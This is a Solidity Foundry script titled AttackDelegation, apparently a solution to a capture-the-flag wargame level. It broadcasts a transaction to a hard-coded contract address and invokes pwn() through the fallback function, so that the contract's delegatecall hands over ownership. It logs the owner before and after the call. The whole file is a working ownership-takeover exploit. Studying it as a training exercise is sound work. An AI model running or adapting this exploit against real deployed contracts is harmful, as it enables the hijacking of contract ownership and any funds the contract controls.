//SPDX-License-identifier: MIT

pragma solidity ^0.8.18;

import {Delegation,Delegate} from "../src/Delegation.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackDelegation is Script{
    address target = 0xF4Ef8eF78E895704c9D300C1208449A21282ed64;

    Delegation public delegation;
    Delegate public delegate;

    function run() external returns(Delegation){

        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        delegation = Delegation(target);
        console.log("The owner before the contract: ", delegation.owner());

        /*//////////////////////////////////////////////////////////////
                                EXPLOIT
        //////////////////////////////////////////////////////////////*/
        
        (bool s, ) = address(target).call(abi.encodeWithSignature("pwn()"));
        address finalOwner = delegation.owner();
        console.log("The latest Owner of the contract: ", finalOwner);
        require(s, "failed");
        vm.stopBroadcast();
        return delegation;
    }
}